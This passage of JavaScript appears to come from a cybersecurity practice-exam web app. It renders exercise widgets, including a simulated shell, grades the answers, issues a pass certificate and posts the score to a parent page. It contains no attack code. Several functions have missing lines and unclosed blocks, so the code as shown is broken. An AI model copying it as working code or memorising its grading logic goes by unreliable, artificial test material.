    b.addEventListener('click',function(){togglePause();});
    ov.appendChild(b);ov.id='pauseov';
    document.body.appendChild(ov);
    $('stage').style.visibility='hidden';
  } else {
    var o=$('pauseov');if(o)o.remove();
    $('stage').style.visibility='';
  }
  renderHeader();
}

/* ---------- hint ---------- */
function useHint(ex){
  var r=res(ex.id);
  if(r.hintUsed||r.submitted)return;
  r.hintUsed=true;
  var box=$('hintarea-'+ex.id);
  if(box){box.style.display='';box.innerHTML='<b>Hint:</b> '+ptext(ex.hint);}
  toast('Hint used — this exercise is now worth at most 9 of 10 points');
  renderHeader();
}
function toast(msg){
  var t=el('div','toast',esc(msg));t.id='toast';
  document.body.appendChild(t);
  setTimeout(function(){var x=$('toast');if(x)x.remove();},2600);
}

    h+='<div class="arte"><div class="arte-t">'+esc(p.label)+'</div><div class="arte-b">'+ptext(p.text)+'</div></div>';
  });

}

/* ---------- submit & feedback ---------- */
function submitExercise(ex){
  var r=res(ex.id);
  if(r.submitted)return;
  var w=S.widgets[ex.id];
  var frac=w.grade();
  var status=frac>=0.999?'correct':(frac>0?'partial':'wrong');
  var pts=Math.max(0,Math.round(10*frac)-(r.hintUsed?1:0));
  r.submitted=true;r.frac=frac;r.status=status;r.awarded=pts;
  r.dangerHit=!!(w.hit&&w.hit.danger);
  r.answerSummary=w.summary();
  w.lock();
  showFeedback(ex,r);
  var sub=$('submit-'+ex.id);if(sub)sub.disabled=true;
  var nx=$('next-'+ex.id);if(nx)nx.style.display='';
  renderHeader();
}
function feedbackHTML(ex,r){
  var cls=r.status==='correct'?'ok':(r.status==='partial'?'mid':'bad');
  var icon=r.status==='correct'?'&#10004;':(r.status==='partial'?'&#9650;':'&#10008;');
  var word=r.status==='correct'?'CORRECT':(r.status==='partial'?'PARTIALLY CORRECT':'INCORRECT');
  var h='<div class="fb '+cls+'"><div class="fb-h"><span aria-hidden="true">'+icon+'</span> '+word;
  h+='</div><div class="fb-b">';
  h+='<div><b>Correct answer:</b> '+r.answerSummary+'</div>';
  h+='<div style="margin-top:9px"><b>Why:</b> '+ptext(ex.explain)+'</div>';
  if(r.dangerHit)h+='<div style="margin-top:9px;color:#fca5a5"><b>&#9888; Dangerous command:</b> what you typed would have destroyed or changed evidence. On a live case that is a serious mistake — the safe, read-only capture was the answer.</div>';
  if(r.status!=='correct')h+='<div style="margin-top:9px"><b>What to study:</b> '+esc(ex.study)+'</div>';
  h+='<div class="ptline">Points for this exercise: <b>'+r.awarded+' / 10</b>'+(r.hintUsed?' (hint used: &minus;1)':'')+'</div>';
  if(ex.perspNote)h+='<div style="margin-top:9px;border-top:1px solid var(--line);padding-top:9px"><b>Two-sided view:</b> '+ptext(ex.perspNote)+'</div>';
  h+='</div></div>';
  return h;
}
function showFeedback(ex,r){
  var w=$('fbwrap-'+ex.id);if(!w)return;
  w.innerHTML=feedbackHTML(ex,r);
  var ok=r.status==='correct'||r.status==='partial';
  toast((ok?'\u2714 Submitted — ':'\u2718 Submitted — ')+r.awarded+'/10 pts');
}


/* ---------- widget factory ---------- */
function makeWidget(ex){
  switch(ex.type){
    case 'qcm':case 'multi':return optsWidget(ex);
    case 'logview':return logWidget(ex);
    case 'match':return matchWidget(ex);
    case 'order':return orderWidget(ex);
    case 'categorize':return catWidget(ex);
    case 'fill':return fillWidget(ex);
    case 'terminal':return termWidget(ex);
    case 'branch':return branchWidget(ex);
    default:return optsWidget(ex);
  }
}
function optRow(labelText,valIdx,dispPos,w,state){
  var b=el('button','opt'+(state.sel.indexOf(valIdx)>=0?' sel':''));
  b.type='button';
  b.dataset.val=valIdx;
  b.innerHTML='<span class="ol">'+letters(dispPos)+'.</span><span>'+ptext(labelText)+'</span>';
  b.setAttribute('role','checkbox');
  b.setAttribute('aria-checked',state.sel.indexOf(valIdx)>=0?'true':'false');
  b.addEventListener('click',function(){
    if(w.locked)return;
    var at=state.sel.indexOf(valIdx);
    if(w.ex.type==='multi'){
      if(at>=0)state.sel.splice(at,1);else{if(state.sel.length>=w.ex.correct.length){toast('You only need '+w.ex.correct.length+' answers — unselect one first');return;}state.sel.push(valIdx);}
    } else {state.sel=[valIdx];}
    Array.prototype.forEach.call(w.root.querySelectorAll('.opt'),function(o){
      var v=parseInt(o.dataset.val,10);
      o.classList.toggle('sel',state.sel.indexOf(v)>=0);
      o.setAttribute('aria-checked',state.sel.indexOf(v)>=0?'true':'false');
    });
  });
  return b;
}
function optsWidget(ex){
  var w={locked:false,root:null,order:[],state:{sel:[]},ex:ex};
  var r=res(ex.id);
  w.order=shuffle(ex.options.map(function(o,i){return i;}));
  w.mount=function(){
    w.root=el('div','opts');
    if(r&&r.picked&&r.picked.length){w.state.sel=r.picked.slice();}
    w.order.forEach(function(oi,pos){
      var b=optRow(ex.options[oi],oi,pos,w,w.state);
      w.root.appendChild(b);
    });
    if(r&&r.submitted)w.lock();
    return w.root;
  };
  w.grade=function(){
    r.picked=w.state.sel.slice();
    var hits=0,misses=0;
    w.state.sel.forEach(function(i){if(ex.correct.indexOf(i)>=0)hits++;else misses++;});
    var k=ex.correct.length;
    var frac=Math.max(0,(hits-misses)/k);
    return frac>=0.999?1:frac;
  };
  w.summary=function(){
    var good=ex.correct.map(function(i){return esc(ex.options[i]);}).join(' <b>and</b> ');
    return good;
  };

/* ---------- log view ---------- */
function logWidget(ex){

  w.state={sel:(r&&r.picked!==undefined&&r.picked!==null)?r.picked:(ans.kind==='lineclick'?-1:[]),f:''};

      var shown=0;
      ex.log.lines.forEach(function(ln,i){
        var t=ln.t;
        if(w.state.f&&t.toLowerCase().indexOf(w.state.f.toLowerCase())<0)return;

        if(ans.kind==='lineclick'){
          b.addEventListener('click',function(){
            if(w.locked)return;
            w.state.sel=i;
            Array.prototype.forEach.call(box.querySelectorAll('.logline'),function(o){o.classList.remove('picked');});
            b.classList.add('picked');
          });
        }
        box.appendChild(b);
      });
      cnt.textContent='Showing '+shown+' of '+ex.log.lines.length+' lines';
    };
    inp.addEventListener('input',function(){w.state.f=inp.value;render();});
    box.appendChild(cnt);
    render();
    w.root.appendChild(box);
    if(ans.kind!=='lineclick'){
      var ow=optsWidget({type:ans.kind,options:ans.options,correct:ans.correct,id:ex.id+'-sub'});
      /* reuse optsWidget against its own state; sync picked on grade */
      w.sub=ow;
      w.root.appendChild(ow.mount());
    }
    if(r&&r.submitted)w.lock();
    return w.root;
  };
  w.grade=function(){
    if(ans.kind==='lineclick'){
      r.picked=w.state.sel;
      return w.state.sel===ans.correctLine?1:0;
    }
    var f=w.sub.grade();
    r.picked=w.state.sel;
    r.subpicked=w.sub.state.sel.slice();
    return f;
  };
  w.summary=function(){
    if(ans.kind==='lineclick')return '<code>'+esc(ex.log.lines[ans.correctLine].t)+'</code>';
    return ans.correct.map(function(i){return esc(ans.options[i]);}).join(' <b>and</b> ');
  };
  w.lock=function(){
    w.locked=true;
    if(ans.kind!=='lineclick'&&w.sub){w.sub.lock();}
  };
  return w;
}
/* ---------- match ---------- */
function matchWidget(ex){
  var w={locked:false,root:null,ex:ex};
  var r=res(ex.id);
  var pairOf={}; /* leftIdx -> rightIdx */
  if(r&&r.pairs){ex.left.forEach(function(_,i){pairOf[i]=r.pairs[i];});}
  var colors=['p1','p2','p3','p4','p5'];
  w.rightOrder=shuffle(ex.right.map(function(o,i){return i;}));
  w.state={selLeft:-1};
  w.mount=function(){
    w.root=el('div','mcols');
    w.L=el('div','mcol');
    w.R=el('div','mcol');
    draw();
    w.root.appendChild(w.L);w.root.appendChild(w.R);
    if(r&&r.submitted)w.lock();
    return w.root;
  };
  function draw(){
    var L=w.L,R=w.R;
    L.innerHTML='';R.innerHTML='';

    R.appendChild(el('h5','','Right — meanings (click to pair)'));

      b.type='button';
      var pid=pairOf[i];
      b.innerHTML='<span>'+esc(txt)+'</span>'+(pid!==undefined&&pid!==null?'<span class="pl '+colors[i%colors.length]+'">'+letters(pid)+'</span>':'');
      b.addEventListener('click',function(){
        if(w.locked)return;
        w.state.selLeft=i;
        draw();
      });
      L.appendChild(b);
    });
    w.rightOrder.forEach(function(ri){
      var b=el('button','mitem');
      b.type='button';
      var usedBy=-1;
      ex.left.forEach(function(_,li){if(pairOf[li]===ri)usedBy=li;});
      b.innerHTML='<span class="ol">'+letters(ri)+'.</span><span>'+esc(ex.right[ri])+'</span>';
      if(usedBy>=0){var tag=el('span','pl '+colors[usedBy%colors.length],'&#10003;');b.appendChild(tag);}
      b.addEventListener('click',function(){
        if(w.locked)return;
        if(w.state.selLeft<0){toast('Pick an item on the left first');return;}
        if(usedBy>=0){pairOf[usedBy]=null;}
        pairOf[w.state.selLeft]=ri;
        w.state.selLeft=-1;
        draw();
      });
      R.appendChild(b);
    });
  }
  w.grade=function(){

      r.pairs=r.pairs||{};
      r.pairs[i]=pairOf[i];
      if(pairOf[i]!==undefined&&pairOf[i]!==null&&pairOf[i]===rp[i])good++;
    });
    return good/ex.left.length;
  };
  w.summary=function(){
    return ex.pairs.map(function(p){return esc(ex.left[p[0]])+' \u2192 '+esc(ex.right[p[1]]);}).join('<br>');
  };
  w.lock=function(){w.locked=true;};
  return w;
}
/* ---------- order / rank ---------- */
function orderWidget(ex){
  var w={locked:false,root:null,ex:ex};
  var r=res(ex.id);
  w.cur=(r&&r.arr)?r.arr.slice():shuffle(ex.items.map(function(o,i){return i;}));
  w.state={sel:-1};
  w.mount=function(){
    w.root=el('div');
    var ol=el('ul','ordlist'+(ex.mode==='rank'?' rankmode':''));
    w.ol=ol;
    w.root.appendChild(ol);
    w.root.appendChild(el('p','dim',(ex.mode==='rank'?'Drag items or use the arrows to rank them — best first. ':'Put the steps in the right order — top to bottom. ')+'Click two rows to swap them.'));
    draw();
    if(r&&r.submitted)w.lock();
    return w.root;
  };
  function draw(){
    var ol=w.ol;
    ol.innerHTML='';
    w.cur.forEach(function(oi,pos){
      var li=el('li','orditem'+(w.state.sel===pos?' sel':''));
      li.setAttribute('draggable',!w.locked?'true':'false');
      li.innerHTML='<span class="ordnum">'+(pos+1)+'</span><span>'+esc(ex.items[oi])+'</span>';
      var btns=el('div','ordbtns');
      var up=el('button','mini','\u2191');up.type='button';up.setAttribute('aria-label','Move up');
      up.addEventListener('click',function(e){e.stopPropagation();if(w.locked)return;swap(pos,pos-1);});
      var dn=el('button','mini','\u2193');dn.type='button';dn.setAttribute('aria-label','Move down');
      dn.addEventListener('click',function(e){e.stopPropagation();if(w.locked)return;swap(pos,pos+1);});
      btns.appendChild(up);btns.appendChild(dn);
      li.appendChild(btns);
      li.addEventListener('click',function(){
        if(w.locked)return;
        if(w.state.sel<0){w.state.sel=pos;}
        else if(w.state.sel===pos){w.state.sel=-1;}
        else{swap(w.state.sel,pos);w.state.sel=-1;}
        draw();
      });
      li.addEventListener('dragstart',function(e){w.dragFrom=pos;e.dataTransfer.setData('text/plain',String(pos));});
      li.addEventListener('dragover',function(e){e.preventDefault();});
      li.addEventListener('drop',function(e){e.preventDefault();if(w.locked)return;var from=w.dragFrom;swap(from,pos);w.state.sel=-1;draw();});
      ol.appendChild(li);
    });
  }
  function swap(a,b){if(b<0||b>=w.cur.length||a===b)return;var t=w.cur[a];w.cur[a]=w.cur[b];w.cur[b]=t;draw();}
  w.grade=function(){
    r.arr=w.cur.slice();
    var good=0;
    w.cur.forEach(function(oi,pos){if(oi===pos)good++;});
    return good/ex.items.length;
  };
  w.summary=function(){
    return ex.items.map(function(t,i){return '<b>'+(i+1)+'.</b> '+esc(t);}).join('<br>');
  };
  w.lock=function(){w.locked=true;if(w.ol)Array.prototype.forEach.call(w.ol.querySelectorAll('.orditem'),function(n){n.setAttribute('draggable','false');});};
  return w;
}
/* ---------- categorize (drag & drop) ---------- */
function catWidget(ex){
  var w={locked:false,root:null,ex:ex};

  w.place={}; /* itemIdx -> zoneIdx */

  function card(txt,i,cls){

      e.stopPropagation();

    });
    b.addEventListener('dragstart',function(e){w.dragItem=i;try{e.dataTransfer.setData('text/plain',String(i));}catch(x){}});
    b.addEventListener('dragover',function(e){e.preventDefault();});
    b.addEventListener('drop',function(e){e.preventDefault();e.stopPropagation();});

    w.zw.innerHTML='';w.bw.innerHTML='';

      zd.addEventListener('keydown',function(e){if(e.key==='Enter'||e.key===' '){e.preventDefault();placeHere();}});
      zd.addEventListener('dragover',function(e){e.preventDefault();zd.classList.add('over');});
      zd.addEventListener('dragleave',function(){zd.classList.remove('over');});
      zd.addEventListener('drop',function(e){

        if(w.locked)return;
        var i=(w.dragItem!==undefined)?w.dragItem:parseInt(e.dataTransfer.getData('text/plain'),10);
        if(!isNaN(i)){w.place[i]=zi;w.state.sel=-1;draw();}
      });
      w.zw.appendChild(zd);
    });
    w.bw.setAttribute('tabindex','0');w.bw.setAttribute('role','button');
    w.bw.setAttribute('aria-label','Item bank. With an item selected, press Enter to return it here.');
    var backToBank=function(){

      if(w.state.sel>=0){delete w.place[w.state.sel];w.state.sel=-1;draw();}
    };
    w.bw.addEventListener('click',backToBank);
    w.bw.addEventListener('keydown',function(e){if(e.key==='Enter'||e.key===' '){e.preventDefault();backToBank();}});
    w.bw.addEventListener('dragover',function(e){e.preventDefault();});
    w.bw.addEventListener('drop',function(e){
      e.preventDefault();
      if(w.locked)return;
      var i=(w.dragItem!==undefined)?w.dragItem:parseInt(e.dataTransfer.getData('text/plain'),10);
      if(!isNaN(i)){delete w.place[i];w.state.sel=-1;draw();}
    });
    w.bankOrder.forEach(function(i){
      if(w.place[i]===undefined||w.place[i]===null)w.bw.appendChild(card(ex.items[i].t,i,'bankitem'));
    });
  }
  w.grade=function(){
    r.place={};

    ex.items.forEach(function(it,i){
      r.place[i]=w.place[i];
      if(w.place[i]===it.z)good++;

  w.summary=function(){

      return '<b>'+esc(z.name)+':</b> '+(its.length?its.join('; '):'—');
    }).join('<br>');

  w.lock=function(){w.locked=true;};
  return w;
}
/* ---------- fill in the blank ---------- */
function fillWidget(ex){
  var w={locked:false,root:null,ex:ex};
  var r=res(ex.id);
  var n=ex.correct.length;
  w.fills=[];
  if(r&&r.fills){for(var i=0;i<n;i++)w.fills[i]=(r.fills[i]===undefined||r.fills[i]===null)?null:r.fills[i];}
  else{for(var j=0;j<n;j++)w.fills[j]=null;}
  w.bankOrder=shuffle(ex.bank.map(function(o,i){return i;}));
  w.state={slot:-1};
  w.mount=function(){
    w.root=el('div');
    w.txt=el('div','filltext');
    w.root.appendChild(w.txt);
    w.root.appendChild(el('h5','dim','Word bank — click a word (then a gap, if you want to choose)'));
    w.bw=el('div','bank');
    w.root.appendChild(w.bw);
    draw();
    if(r&&r.submitted)w.lock();
    return w.root;
  };
  function draw(){
    var parts=ex.text.split(/\{\{\d\}\}/);
    var h='';
    for(var i=0;i<parts.length;i++){
      h+=esc(parts[i]);
      if(i<n){
        var v=w.fills[i];
        h+='<span class="slot'+(v!==null?' filled':'')+(w.state.slot===i?' sel':'')+'" data-slot="'+i+'" role="button" tabindex="0">'+(v===null?'&nbsp;':esc(v))+'</span>';
      }
    }
    w.txt.innerHTML=h;
    Array.prototype.forEach.call(w.txt.querySelectorAll('.slot'),function(s){
      var i=parseInt(s.getAttribute('data-slot'),10);
      var act=function(){
        if(w.locked)return;
        if(w.fills[i]!==null){w.fills[i]=null;draw();return;}
        w.state.slot=i;draw();
      };
      s.addEventListener('click',act);
      s.addEventListener('keydown',function(e){if(e.key==='Enter'||e.key===' '){e.preventDefault();act();}});
    });
    w.bw.innerHTML='';
    w.bankOrder.forEach(function(bi){
      var used=w.fills.indexOf(ex.bank[bi]);
      var b=el('button','wchip'+(used>=0?' used':'')+(w.state.sel===bi?' sel':''));
      b.type='button';
      b.textContent=ex.bank[bi];
      b.addEventListener('click',function(){
        if(w.locked||used>=0)return;
        var slot=(w.state.slot>=0&&w.fills[w.state.slot]===null)?w.state.slot:w.fills.indexOf(null);
        if(slot<0){toast('All gaps are filled — click a gap to clear it first');return;}
        w.fills[slot]=ex.bank[bi];
        w.state.slot=-1;
        draw();
      });
      w.bw.appendChild(b);
    });
  }
  w.grade=function(){
    r.fills=w.fills.slice();
    var good=0;
    for(var i=0;i<n;i++){if(w.fills[i]===ex.correct[i])good++;}
    return good/n;
  };
  w.summary=function(){
    var parts=ex.text.split(/\{\{\d\}\}/);
    var h='';
    for(var i=0;i<parts.length;i++){h+=esc(parts[i]);if(i<n)h+='<code>'+esc(ex.correct[i])+'</code>';}
    return h;
  };
  w.lock=function(){w.locked=true;};
  return w;
}


/* ---------- terminal ---------- */
function termWidget(ex){
  var w={locked:false,root:null,ex:ex};
  var r=S.work[ex.id];
  w.state={lastCmd:(r&&r.lastCmd)?r.lastCmd:null,hist:(r&&r.hist)?r.hist.slice():[]};
  w.mount=function(){
    w.root=el('div');
    if(ex.timeLimit){
      var tl=el('div','tag red','\u23F1 Reduced timer for this terminal task: '+ex.timeLimit+' s once you type the first character');
      w.root.appendChild(tl);
      w.tlLeft=ex.timeLimit;
    }
    if(ex.sample){
      var sx=el('div','syntax');
      sx.innerHTML='<h6>SYNTAX REMINDER</h6>'+
        '<pre>'+esc(ex.sample.shape)+'</pre>'+
        '<pre>'+esc(ex.sample.meaning)+'</pre>'+
        '<pre>Example (different target): '+esc(ex.sample.example)+'</pre>'+
        '<h6 style="margin-top:8px">EXPECTED OUTPUT SHAPE</h6>'+
        '<pre>'+esc(ex.sample.output)+'</pre>';
      w.root.appendChild(sx);
    }
    var t=el('div','term');
    var tt=el('div','termtitle','<span>\u25A0</span> '+esc(ex.os)+' — simulated shell (nothing real is executed)');
    var out=el('div','termout');
    out.innerHTML='<span class="lv-sys">'+esc(ex.banner||'Simulation shell. Type the command and press Enter. Then press Submit answer.')+'</span>\n';
    (w.state.hist||[]).forEach(function(h){out.innerHTML+=esc(h)+'\n';});
    var inw=el('div','termin');
    var pr=el('span','pr',esc(ex.prompt)+' ');
    var inp=el('input');inp.type='text';inp.spellcheck=false;
    inp.setAttribute('aria-label','Type the command');
    if(w.state.lastCmd)inp.value=w.state.lastCmd;
    inw.appendChild(pr);inw.appendChild(inp);
    t.appendChild(tt);t.appendChild(out);t.appendChild(inw);
    w.root.appendChild(t);
    w.out=out;w.inp=inp;
    var run=function(){
      var c=inp.value;
      if(!c.trim())return;
      w.state.lastCmd=c;
      if(r)r.lastCmd=c;
      if(ex.timeLimit&&!w.tlId){
        w.tlId=setInterval(function(){
          if(S.paused)return;
          w.tlLeft--;
          if(w.tlLeft<=0&&!w.locked){
            clearInterval(w.tlId);
            out.innerHTML+='\n<span class="lv-crit">TIME UP for this task — submit now with what you have.</span>';
            out.scrollTop=out.scrollHeight;
          }
        },1000);
      }
      w.exec(c,out,inp);
    };
    inp.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();run();}});
    if(r&&r.submitted){w.lock();w.inp.disabled=true;}
    return w.root;
  };
  w.exec=function(c,out,inp){
    var nc=normCmd(c);
    var resp=null,ok=false;
    for(var i=0;i<ex.accepted.length;i++){
      var a=ex.accepted[i];
      if(new RegExp(a.re,'i').test(nc)){resp=a;break;}
    }
    w.state.hist.push((ex.prompt+' '+c));
    if(resp){
      w.state.hist.push(resp.out);
      w.lastKind=resp.ok?'ok':(resp.danger?'danger':'near');
    } else {
      w.state.hist.push('bash: '+c.trim().split(' ')[0]+': command not found (simulation recognises only the commands this task needs)');
      w.lastKind='nf';
    }
    out.innerHTML='';
    w.state.hist.forEach(function(h){
      var cls=h.indexOf(ex.prompt+' ')===0?'lv-sys':(h.indexOf('TIME UP')===0?'lv-crit':'');
      out.innerHTML+='<span class="'+cls+'">'+esc(h)+'</span>\n';
    });
    out.scrollTop=out.scrollHeight;
    inp.value='';
  };
  w.grade=function(){
    if(!w.state.lastCmd)return 0;
    var nc=normCmd(w.state.lastCmd);
    var best=0;
    for(var i=0;i<ex.accepted.length;i++){
      var a=ex.accepted[i];
      if(new RegExp(a.re,'i').test(nc)){
        best=a.ok?1:0;
        w.hit=a;
        break;
      }
    }
    r.lastCmd=w.state.lastCmd;r.hist=w.state.hist.slice();
    return best;
  };
  w.summary=function(){
    return '<div class="copyblk"><code>'+esc(ex.canonical)+'</code></div>';
  };
  w.lock=function(){
    w.locked=true;
    if(w.inp)w.inp.disabled=true;
    if(w.tlId){clearInterval(w.tlId);w.tlId=null;}
  };
  return w;
}
/* ---------- branching ---------- */

    sblk.appendChild(el('div','blk-h','<span aria-hidden="true">&#128203;</span> SCENARIO'));
    var sb=el('div','blk-b');
    (stp.scenario).forEach(function(p){
      sb.innerHTML+='<div class="arte"><div class="arte-t">'+esc(p.label)+'</div><div class="arte-b">'+ptext(p.text)+'</div></div>';
    });
    sblk.appendChild(sb);
    w.root.appendChild(sblk);
    var q=el('div','blk quest');
    q.appendChild(el('div','blk-h','<span aria-hidden="true">&#10067;</span> QUESTION'));
    q.appendChild(el('div','blk-b',esc(stp.question)));
    w.root.appendChild(q);
    var a=el('div','blk answ');
    a.appendChild(el('div','blk-h','<span aria-hidden="true">&#9997;</span> YOUR ANSWER'));
    var ab=el('div','blk-b');
    var ow=optsWidget({type:'qcm',id:ex.id+'-s'+w.step,options:stp.options,correct:[stp.correct]});
    ab.appendChild(ow.mount());
    if(w.picked>=0){
      ow.state.sel=[w.picked];
      Array.prototype.forEach.call(ow.root.querySelectorAll('.opt'),function(o){
        var v=parseInt(o.dataset.val,10);
        o.classList.toggle('sel',v===w.picked);
        o.setAttribute('aria-checked',v===w.picked?'true':'false');
      });
    }
    var br=el('div','btnrow');
    var go=el('button','mainbtn',w.step===ex.steps.length-1?'Confirm final decision':'Confirm step '+(w.step+1));
    go.type='button';
    go.addEventListener('click',function(){
      if(w.locked||w.done)return;
      if(ow.state.sel.length===0){toast('Choose an option first');return;}
      w.picked=ow.state.sel[0];
      r.bPicked=w.picked;
      if(w.picked===stp.correct){
        w.goodSteps++;r.goodSteps=w.goodSteps;
        w.step++;r.step=w.step;
        if(w.step<ex.steps.length){
          draw();
          appendOutcome('ok','&#10004; GOOD MOVE',ptext(stp.ok),'');
        } else {
          w.done=true;r.bDone=true;w.locked=true;
          appendOutcome('ok','&#10004; GOOD MOVE',ptext(stp.ok),'<div style="margin-top:9px"><b>All steps complete.</b> Press "Submit answer" above to record this exercise.</div>');
        }
      } else {
        w.done=true;r.bDone=true;w.locked=true;
        appendOutcome('bad','&#10008; THE BRANCH BREAKS HERE',ptext(stp.bad),'<div style="margin-top:9px"><b>What to study:</b> '+esc(ex.study)+'</div><div style="margin-top:6px">Press "Submit answer" above to record this exercise — or Skip to retry it from the review screen.</div>');
      }
      window.scrollTo(0,document.body.scrollHeight);
    });
    br.appendChild(go);
    ab.appendChild(br);
    a.appendChild(ab);
    w.root.appendChild(a);
  }
  function appendOutcome(kind,title,bodyHtml,extraHtml){
    var b=el('div','fb '+kind);
    b.innerHTML='<div class="fb-h"><span aria-hidden="true">'+title+'</span> '+(kind==='ok'?'GOOD MOVE':'THE BRANCH BREAKS HERE')+'</div>'+
      '<div class="fb-b">'+bodyHtml+extraHtml+'</div>';
    w.root.appendChild(b);
  }
  w.grade=function(){
    return Math.min(1,w.goodSteps/ex.steps.length);
  };
  w.summary=function(){
    return ex.steps.map(function(s,i){return '<b>Step '+(i+1)+':</b> '+esc(s.options[s.correct]);}).join('<br>');
  };
  w.lock=function(){w.locked=true;};
  return w;
}

/* ---------- exam flow ---------- */
function startExam(){
  S.order=shuffle(D.exercises.map(function(e,i){return i;}));
  S.idx=0;S.widgets={};S.work={};S.fromReview=false;S.reported=false;
  S.timeLeft=D.timerSec;S.paused=false;
  renderExercise();
  startTimer();
}
function skipCurrent(ex){
  var r=res(ex.id);
  if(r.submitted)return;
  r.status='skipped';
  toast('Skipped — find it again on the "Review skipped" screen before you finish');
  if(S.fromReview){S.fromReview=false;renderReview();}
  else nextExercise();
}
function nextExercise(){
  if(S.fromReview){S.fromReview=false;renderReview();return;}
  if(S.idx<S.order.length-1){S.idx++;renderExercise();return;}
  var pool=skippedList();
  if(pool.length){renderReview();}
  else finishExam(false);
}
function renderReview(){
  S.phase='review';
  var st=$('stage');st.innerHTML='';
  var sc=el('div','screen');
  var c=el('div','card');
  c.appendChild(el('h3','','\u26A0 Review skipped exercises'));
  c.appendChild(el('p','dim','The clock keeps running. You can return to a skipped exercise as many times as you want until the timer ends — if the timer ends while you are here, the exam finishes automatically with what was answered. If you finish with skipped exercises still unanswered, they are excluded from the score: they count as neither correct nor wrong, and their points are removed from the total.'));
  skippedList().forEach(function(ex){
    var it=el('div','revitem');
    it.innerHTML='<div class="ri-b"><h5>'+esc(ex.id+' — '+(ex.title||ex.theme))+'</h5><span class="dim">'+esc(ex.summary)+'</span></div>';
    var b=el('button','mainbtn','Answer now');
    b.addEventListener('click',function(){
      S.idx=S.order.indexOf(D.exercises.indexOf(ex));
      S.fromReview=true;
      renderExercise();
    });
    it.appendChild(b);
    c.appendChild(it);
  });
  var fin=el('button','mainbtn','Finish and see results \u2192');
  fin.addEventListener('click',function(){finishExam(false);});
  var w=el('div','btnrow');w.style.justifyContent='center';w.style.margin='16px 0';
  w.appendChild(fin);
  sc.appendChild(c);sc.appendChild(w);
  st.appendChild(sc);
  renderHeader();
  window.scrollTo(0,0);
}
/* ---------- results ---------- */
function computeResult(){
  var answered=answeredList();
  var correct=0,wrong=0;
  answered.forEach(function(ex){
    var st=S.work[ex.id].status;
    if(st==='correct')correct++;else wrong++;
  });
  var skipped=skippedList();
  var untouched=S.order.length-answered.length-skipped.length;
  var score=earnedPoints();
  var total=possiblePoints();
  var pct=total>0?Math.round(score/total*100):0;
  return {answered:answered,correct:correct,wrong:wrong,skipped:skipped,untouched:untouched,score:score,total:total,pct:pct,passed:pct>=D.meta.passMark};
}
function reportScore(correct,total){
  var percent=total>0?Math.round((correct/total)*100):0;
  try{
    parent.postMessage({
      type:'CYBERPULSE_SCORE',
      topicId:D.meta.topicId,
      batch:D.meta.batch,
      score:correct,
      total:total,
      percent:percent,
      passed:percent>=D.meta.passMark
    },location.origin);
  }catch(e){
    /* Opened directly rather than inside the site. Nothing to report to. */
  }
}
function finishExam(auto){
  stopTimer();
  S.paused=false;
  var o=$('pauseov');if(o)o.remove();
  if($('stage'))$('stage').style.visibility='';
  S.phase='results';
  var R=computeResult();
  renderResults(R,auto);
}
function renderResults(R,auto){
  var st=$('stage');st.innerHTML='';
  var sc=el('div','screen');
  var head=el('div','card');
  head.appendChild(el('h3','',esc(D.meta.title)+' — final result'+(auto?' (time is up)':'')));
  var top=el('div','res-top');
  var big=el('div','scorebig','0%');
  big.id='bigscore';
  big.style.color=R.passed?'var(--good)':'var(--bad)';
  top.appendChild(big);
  top.appendChild(el('div','mut','Score <b>'+R.score+' / '+R.total+' pts</b><br>computed over answered exercises only'));
  head.appendChild(top);
  sc.appendChild(head);
  var panel;
  if(R.passed){
    panel=el('div','passpanel');
    panel.innerHTML='<h2>&#127942; PASS — '+(R.pct>=100?'Flawless':'Certificate earned')+'</h2>'+
      '<p class="certline">This certifies that <b>'+esc(S.learner||'the learner')+'</b> passed the '+esc(D.meta.title)+' practice exam</p>'+
      '<p class="certline">Score: <b>'+R.pct+'%</b> · Pass mark: '+D.meta.passMark+'% · Tier: <b style="color:'+D.severity.color+'">'+esc(D.severity.label)+'</b> · '+new Date().toLocaleDateString()+'</p>'+
      '<p class="certline" style="margin-top:8px">You showed command of '+esc(D.techniqueId)+' — '+esc(D.techniqueName)+' at this tier. Keep the report below as your revision sheet.</p>';
  } else {
    panel=el('div','failpanel');
    panel.innerHTML='<h2>&#10008; NOT PASSED — you must retake it</h2>'+
      '<p class="certline">You scored <b>'+R.pct+'%</b>; the pass mark is '+D.meta.passMark+'%.</p>'+
      '<p class="certline">Read the report below, focus on the "what to study" lines, then retake the exam. Questions and answers will be reshuffled.</p>';
  }
  sc.appendChild(panel);
  var sg=el('div','statgrid');
  var mk=function(n,l){var s=el('div','stat');s.innerHTML='<div class="n">'+n+'</div><div class="l">'+esc(l)+'</div>';return s;};
  sg.appendChild(mk(R.correct,'\u2714 Correct'));
  sg.appendChild(mk(R.wrong,'\u2718 Incorrect'));
  sg.appendChild(mk(R.skipped.length,'\u26A0 Skipped, left unanswered (excluded)'));
  sg.appendChild(mk(R.untouched,'Not reached (excluded)'));
  sc.appendChild(sg);
  /* per-theme bars */
  var th={};
  D.exercises.forEach(function(ex){
    var r=S.work[ex.id];
    if(!th[ex.theme])th[ex.theme]={got:0,base:0};
    if(r&&(r.status==='correct'||r.status==='partial'||r.status==='wrong')){th[ex.theme].got+=r.awarded;th[ex.theme].base+=10;}
  });
  var tw=el('div','card');
  tw.appendChild(el('h3','','Per-theme progress'));
  Object.keys(th).forEach(function(k){
    var t=th[k];
    var pct=t.base?Math.round(t.got/t.base*100):0;
    var b=el('div','themebar');
    b.innerHTML='<div class="tl"><span>'+esc(k)+'</span><span>'+pct+'%</span></div><div class="tb"><i style="width:'+pct+'%;background:'+(pct>=70?'var(--good)':(pct>0?'var(--warn)':'var(--bad)'))+'"></i></div>';
    tw.appendChild(b);
  });
  sc.appendChild(tw);
  /* detailed report */
  var rep=el('div','card');
  rep.appendChild(el('h3','','Detailed report'));
  rep.appendChild(el('p','dim','Every exercise, in exam order. Skipped-and-unanswered exercises are shown as excluded.'));
  S.order.forEach(function(oi,n){
    var ex=D.exercises[oi];
    var r=S.work[ex.id]||{status:null};
    var it=el('div','repitem');
    var chip='',lbl='';
    if(r.status==='correct'){chip='ok';lbl='\u2714 Correct';}
    else if(r.status==='partial'){chip='part';lbl='\u25B0 Partial';}
    else if(r.status==='wrong'){chip='bad';lbl='\u2718 Incorrect';}
    else {chip='skip';lbl='Not answered — excluded from score';}
    var h=el('div','rep-h');
